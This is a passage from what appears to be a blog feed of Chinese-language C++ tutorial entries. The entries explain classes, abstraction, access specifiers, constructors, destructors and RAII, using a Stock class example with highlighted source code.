class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\stock.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数定义</span></span><br><span class="line">Stock::Stock() &#123;</span><br><span class="line">    company = <span class="string">&quot;no name&quot;</span>;</span><br><span class="line">    shares = <span class="number">0</span>;</span><br><span class="line">    share_val = <span class="number">0.0</span>;</span><br><span class="line">    total_val = <span class="number">0.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Stock::Stock(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr) &#123;</span><br><span class="line">    company = co;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Number of shares can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; company &lt;&lt; <span class="string">&quot; shares set to 0.\n&quot;</span>; <span class="comment">// 使用 cerr 输出错误</span></span><br><span class="line">        shares = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares = n;</span><br><span class="line">    &#125;</span><br><span class="line">    share_val = pr;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 析构函数定义</span></span><br><span class="line">Stock::~Stock() &#123;</span><br><span class="line">    <span class="comment">// 在这个简单类中，析构函数体可以为空</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Destructor called for &quot; &lt;&lt; company &lt;&lt; &quot;\n&quot;; // 可以取消注释来观察</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他成员函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Number of shares purchased can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares += num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Number of shares sold can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; shares) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: You can&#x27;t sell more than you have! &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares -= num;</span><br><span class="line">        share_val = price;</span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::update</span><span class="params">(<span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    share_val = price;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 使用 iomanip 来设置格式可能更清晰</span></span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags orig =</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::streamsize prec = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Company: &quot;</span> &lt;&lt; company</span><br><span class="line">              &lt;&lt; <span class="string">&quot;  Shares: &quot;</span> &lt;&lt; shares &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Share Price: $&quot;</span> &lt;&lt; share_val;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Total Worth: $&quot;</span> &lt;&lt; total_val &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(orig, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(prec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-3-6-构造函数和析构函数小结"><a href="#10-3-6-构造函数和析构函数小结" class="headerlink" title="10.3.6 构造函数和析构函数小结"></a>10.3.6 构造函数和析构函数小结</h2><ul><li><strong>构造函数:</strong><ul><li>  与类同名，无返回类型。</li><li>  在创建对象时自动调用，用于初始化对象。</li><li>  可以重载（提供不同的参数列表）。</li><li>  如果没有定义任何构造函数，编译器会生成一个默认构造函数（无参数，什么也不做）。</li><li>  如果定义了任何构造函数，编译器不再生成默认构造函数；如果需要无参数构造，必须自己定义。</li></ul></li><li><strong>析构函数:</strong><ul><li>  类名前加 <code>~</code>，无返回类型，无参数。</li><li>  在对象销毁时自动调用，用于清理资源。</li><li>  不能重载，一个类只有一个析构函数。</li><li>  如果类中使用了 <code>new</code> 分配资源，通常需要在析构函数中使用 <code>delete</code> 来释放。</li></ul></li></ul><p>构造函数和析构函数是 C++ 类机制的重要组成部分，它们确保了对象的正确初始化和资源的安全释放，是实现<strong>资源获取即初始化 (RAII - Resource Acquisition Is Initialization)</strong> 这一重要 C++ 编程范式的基石。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.2 抽象和类</title>
      <link href="2025/04/26/10.2_%E6%8A%BD%E8%B1%A1%E5%92%8C%E7%B1%BB/"/>
      <url>2025/04/26/10.2_%E6%8A%BD%E8%B1%A1%E5%92%8C%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>面向对象编程（OOP）的核心思想之一是**抽象 (Abstraction)**。在编程中，抽象意味着关注事物的本质特征和行为，而忽略其不重要的内部细节。我们每天都在使用抽象：当你开车时，你只需要知道如何使用方向盘、油门和刹车（接口），而不需要了解引擎内部复杂的机械原理（实现细节）。</p><h2 id="10-2-1-类型是什么"><a href="#10-2-1-类型是什么" class="headerlink" title="10.2.1 类型是什么"></a>10.2.1 类型是什么</h2><p>在编程语言中，“类型”（Type）定义了一组可能的值以及可以对这些值执行的操作。</p><ul><li>  <strong>内置类型 (Built-in Types):</strong> C++ 提供了像 <code>int</code>, <code>float</code>, <code>char</code>, <code>bool</code> 这样的基本类型。我们知道 <code>int</code> 可以存储整数，并且可以对它们执行加、减、乘、除等运算。编译器知道如何表示这些类型的数据以及如何执行这些操作。</li><li>  <strong>用户定义类型 (User-Defined Types - UDT):</strong> C++ 允许程序员创建自己的类型来模拟现实世界或特定问题域中的概念。这就是<strong>类 (Class)</strong> 发挥作用的地方。类是一种将数据（属性）和操作这些数据的函数（方法）捆绑在一起的机制，从而创建新的数据类型。</li></ul><p>例如，如果你在编写一个股票交易程序，你可能需要一个表示“股票”的类型。这个类型应该包含哪些数据（如股票名称、持有数量、单价）？可以对它执行哪些操作（如购买、出售、更新价格、显示信息）？类允许你精确地定义这些。</p><h2 id="10-2-2-C-中的类"><a href="#10-2-2-C-中的类" class="headerlink" title="10.2.2 C++中的类"></a>10.2.2 C++中的类</h2><p>类是创建对象的蓝图或模板。它定义了：</p><ol><li> <strong>数据成员 (Data Members):</strong> 对象将存储的数据（也称为属性、状态）。</li><li> <strong>成员函数 (Member Functions):</strong> 可以对对象的数据执行的操作（也称为方法、行为）。</li></ol><p><strong>类声明的基本语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 私有数据成员和成员函数</span></span><br><span class="line">    <span class="comment">// 通常将数据成员放在这里，实现数据隐藏</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 公有数据成员和成员函数</span></span><br><span class="line">    <span class="comment">// 这是类的公共接口，外部代码通过它们与对象交互</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="comment">// 保护成员 (将在继承中讨论)</span></span><br><span class="line">&#125;; <span class="comment">// 注意末尾的分号</span></span><br></pre></td></tr></table></figure><ul><li>  <strong><code>class</code> 关键字:</strong> 表明你正在定义一个类。</li><li>  <strong><code>ClassName</code>:</strong> 你为新类型指定的名称（遵循变量命名规则，通常首字母大写）。</li><li><strong>访问说明符 (Access Specifiers):</strong><ul><li>  <code>private</code>: 私有成员只能被<strong>类的内部成员函数</strong>访问。这是实现<strong>数据隐藏 (Data Hiding)</strong> 的关键，保护数据不被外部代码随意修改，是封装的重要体现。默认情况下，类成员是 <code>private</code> 的。</li><li>  <code>public</code>: 公有成员可以被程序中的<strong>任何地方</strong>访问（通过类的对象）。它们构成了类的**公共接口 (Public Interface)**。</li><li>  <code>protected</code>: 与继承相关，现在可以暂时将其视为与 <code>private</code> 类似。</li></ul></li><li>  <strong>成员:</strong> 类定义的花括号 <code>&#123;&#125;</code> 内部声明的变量（数据成员）和函数（成员函数）。</li></ul><p><strong>示例：定义一个简单的 <code>Stock</code> 类</strong></p><p>假设我们要创建一个表示股票持有的类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通常放在头文件 (e.g., stock.h) 中</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 为了使用 std::string</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>: <span class="comment">// 数据成员通常是私有的</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> company;</span><br><span class="line">    <span class="keyword">long</span> shares;</span><br><span class="line">    <span class="keyword">double</span> share_val;</span><br><span class="line">    <span class="keyword">double</span> total_val;</span><br><span class="line">    <span class="comment">// 一个私有辅助函数，只能在类内部调用</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_tot</span><span class="params">()</span> </span>&#123; total_val = shares * share_val; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>: <span class="comment">// 成员函数通常是公有的，构成接口</span></span><br><span class="line">    <span class="comment">// 函数原型 (声明)</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">acquire</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr)</span></span>; <span class="comment">// 买入股票</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;                      <span class="comment">// 增持股票</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span></span>;                     <span class="comment">// 卖出股票</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">double</span> price)</span></span>;                             <span class="comment">// 更新股价</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 显示股票信息 (const表明此函数不修改对象)</span></span><br><span class="line">&#125;; <span class="comment">// 类定义结束</span></span><br></pre></td></tr></table></figure><p>这个 <code>Stock</code> 类定义了一个新的数据类型。它封装了股票相关的数据 (<code>company</code>, <code>shares</code>, <code>share_val</code>, <code>total_val</code>) 和操作这些数据的函数 (<code>acquire</code>, <code>buy</code>, <code>sell</code>, <code>update</code>, <code>show</code>)。数据成员被设为 <code>private</code>，外部代码不能直接访问它们，只能通过 <code>public</code> 的成员函数来交互。<code>set_tot()</code> 是一个内部辅助函数，也被设为 <code>private</code>。</p><h2 id="10-2-3-实现类成员函数"><a href="#10-2-3-实现类成员函数" class="headerlink" title="10.2.3 实现类成员函数"></a>10.2.3 实现类成员函数</h2><p>类定义通常只包含成员函数的<strong>声明（原型）</strong>。函数的<strong>定义（实现）</strong>可以放在类声明的内部（如果函数很简单，可以作为内联函数），或者更常见地，放在类声明的外部（通常在对应的源文件 <code>.cpp</code> 中）。</p><p>当在类外部定义成员函数时，你需要使用<strong>作用域解析运算符 <code>::</code></strong> 来指明这个函数属于哪个类。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ReturnType <span class="title">ClassName::FunctionName</span><span class="params">(ParameterList)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例：实现 <code>Stock</code> 类的成员函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通常放在源文件 (e.g., stock.cpp) 中</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// 包含类定义的头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用作用域解析运算符 :: 指明函数属于 Stock 类</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::acquire</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;co, <span class="keyword">long</span> n, <span class="keyword">double</span> pr)</span> </span>&#123;</span><br><span class="line">    company = co;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares can&#x27;t be negative; &quot;</span></span><br><span class="line">                  &lt;&lt; company &lt;&lt; <span class="string">&quot; shares set to 0.\n&quot;</span>;</span><br><span class="line">        shares = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares = n;</span><br><span class="line">    &#125;</span><br><span class="line">    share_val = pr;</span><br><span class="line">    set_tot(); <span class="comment">// 调用私有成员函数计算总值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::buy</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares purchased can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares += num;</span><br><span class="line">        share_val = price; <span class="comment">// 假设按新价格计算</span></span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::sell</span><span class="params">(<span class="keyword">long</span> num, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of shares sold can&#x27;t be negative. &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (num &gt; shares) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You can&#x27;t sell more than you have! &quot;</span></span><br><span class="line">                  &lt;&lt; <span class="string">&quot;Transaction aborted.\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        shares -= num;</span><br><span class="line">        share_val = price; <span class="comment">// 假设按新价格计算</span></span><br><span class="line">        set_tot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::update</span><span class="params">(<span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line">    share_val = price;</span><br><span class="line">    set_tot();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意 const 关键字在函数定义和声明中都要有</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stock::show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置输出格式</span></span><br><span class="line">    <span class="built_in">std</span>::ios_base::fmtflags orig =</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::streamsize prec = <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Company: &quot;</span> &lt;&lt; company</span><br><span class="line">              &lt;&lt; <span class="string">&quot;  Shares: &quot;</span> &lt;&lt; shares &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Share Price: $&quot;</span> &lt;&lt; share_val;</span><br><span class="line">    <span class="comment">// 设置精度为2位小数显示总价</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  Total Worth: $&quot;</span> &lt;&lt; total_val &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复原始格式</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(orig, <span class="built_in">std</span>::ios_base::floatfield);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(prec);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意：私有成员函数 set_tot() 也可以在类外部定义，</span></span><br><span class="line"><span class="comment">// 但因为它很简单，通常会直接在类定义内部实现（如上所示），</span></span><br><span class="line"><span class="comment">// 这样它就可能被编译器视为内联函数。</span></span><br><span class="line"><span class="comment">// 如果在外部定义：</span></span><br><span class="line"><span class="comment">// void Stock::set_tot() &#123;</span></span><br><span class="line"><span class="comment">//     total_val = shares * share_val;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><p><strong><code>const</code> 成员函数:</strong><br>在 <code>show()</code> 函数声明和定义的末尾都有 <code>const</code> 关键字。这表明 <code>show()</code> 是一个<strong>常量成员函数</strong>，它承诺不会修改调用它的对象的数据成员。这是一个好习惯，可以提高代码的可读性和安全性，并允许对 <code>const</code> 对象调用此函数。</p><h2 id="10-2-4-使用类"><a href="#10-2-4-使用类" class="headerlink" title="10.2.4 使用类"></a>10.2.4 使用类</h2><p>一旦定义了类（蓝图），你就可以创建该类的<strong>对象 (Objects)</strong> 或**实例 (Instances)**。创建对象就像声明一个基本类型的变量一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 main() 函数或其他函数中</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stock.h&quot;</span> <span class="comment">// 需要包含类定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建两个 Stock 对象 (实例)</span></span><br><span class="line">    Stock stock1;</span><br><span class="line">    Stock stock2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用点号 . (成员访问运算符) 调用对象的公有成员函数</span></span><br><span class="line">    stock1.acquire(<span class="string">&quot;NanoSmart&quot;</span>, <span class="number">20</span>, <span class="number">12.50</span>);</span><br><span class="line">    stock1.show(); <span class="comment">// 显示 stock1 的信息</span></span><br><span class="line"></span><br><span class="line">    stock2.acquire(<span class="string">&quot;Boffo Objects&quot;</span>, <span class="number">2</span>, <span class="number">180.0</span>);</span><br><span class="line">    stock2.show(); <span class="comment">// 显示 stock2 的信息</span></span><br><span class="line"></span><br><span class="line">    stock2.buy(<span class="number">5</span>, <span class="number">190.0</span>); <span class="comment">// 增持 stock2</span></span><br><span class="line">    stock2.show();</span><br><span class="line"></span><br><span class="line">    stock1.sell(<span class="number">10</span>, <span class="number">15.75</span>); <span class="comment">// 卖出部分 stock1</span></span><br><span class="line">    stock1.show();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误！不能直接访问私有成员</span></span><br><span class="line">    <span class="comment">// stock1.shares = 50; // 编译错误</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; stock1.company; // 编译错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>Stock stock1;</code> 创建了一个名为 <code>stock1</code> 的 <code>Stock</code> 类型的对象。</li><li>  使用<strong>成员访问运算符（点号 <code>.</code>）</strong>来调用对象的公有成员函数，例如 <code>stock1.acquire(...)</code> 或 <code>stock2.show()</code>。</li><li>  每个对象都有自己的一套数据成员。<code>stock1</code> 的 <code>shares</code> 和 <code>stock2</code> 的 <code>shares</code> 是相互独立的。</li><li>  你不能从对象外部直接访问 <code>private</code> 成员，这强制你必须通过类提供的公共接口（<code>public</code> 函数）来与对象交互。</li></ul><h2 id="10-2-5-修改实现"><a href="#10-2-5-修改实现" class="headerlink" title="10.2.5 修改实现"></a>10.2.5 修改实现</h2><p>将类的接口（头文件中的声明）和实现（源文件中的定义）分开的一个主要好处是<strong>封装</strong>带来的灵活性。</p><ul><li>  <strong>接口 (Interface):</strong> 头文件 (<code>stock.h</code>) 定义了如何<strong>使用</strong>这个类（公共成员函数）。使用类的代码（如 <code>main()</code> 函数）只需要包含头文件。</li><li>  <strong>实现 (Implementation):</strong> 源文件 (<code>stock.cpp</code>) 包含了成员函数具体如何工作。</li></ul><p>只要类的<strong>公共接口保持不变</strong>（函数名、参数、返回类型不变），你就可以自由地修改源文件中的<strong>实现细节</strong>（例如，改进 <code>set_tot</code> 的计算方式，或者改变内部数据的存储方式），而<strong>不需要修改或重新编译</strong>使用该类的其他代码文件（如包含 <code>main()</code> 的文件）。只需要重新编译实现文件 (<code>stock.cpp</code>) 并重新链接即可。</p><p>这大大降低了维护成本，并使得代码库更容易更新和改进。用户只关心“能做什么”（接口），而不必关心“怎么做”（实现）。</p><h2 id="10-2-6-小结"><a href="#10-2-6-小结" class="headerlink" title="10.2.6 小结"></a>10.2.6 小结</h2><ul><li>  <strong>抽象</strong>是关注本质、忽略细节的编程思想。</li><li>  <strong>类</strong>是C++实现抽象和创建用户定义类型的主要机制。</li><li>  类将<strong>数据（成员变量）</strong>和<strong>操作数据的函数（成员函数）</strong>捆绑在一起。</li><li>  <strong>访问说明符</strong>（<code>public</code>, <code>private</code>, <code>protected</code>）控制对类成员的访问。</li><li>  <strong>数据隐藏</strong>（通常将数据设为 <code>private</code>）是封装的关键，保护数据并隐藏实现细节。</li><li>  <strong>公共接口</strong>（<code>public</code> 成员函数）定义了如何与类的对象交互。</li><li>  成员函数通常在类外部使用<strong>作用域解析运算符 <code>::</code></strong> 来定义。</li><li>  使用<strong>点号 <code>.</code></strong> 访问对象的公有成员。</li><li>  将接口和实现分离（头文件/源文件）可以提高代码的模块化和可维护性。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10.1 过程性编程和面向对象编程</title>
      <link href="2025/04/26/10.1_%E8%BF%87%E7%A8%8B%E6%80%A7%E7%BC%96%E7%A8%8B%E5%92%8C%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"/>
      <url>2025/04/26/10.1_%E8%BF%87%E7%A8%8B%E6%80%A7%E7%BC%96%E7%A8%8B%E5%92%8C%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/</url>
      
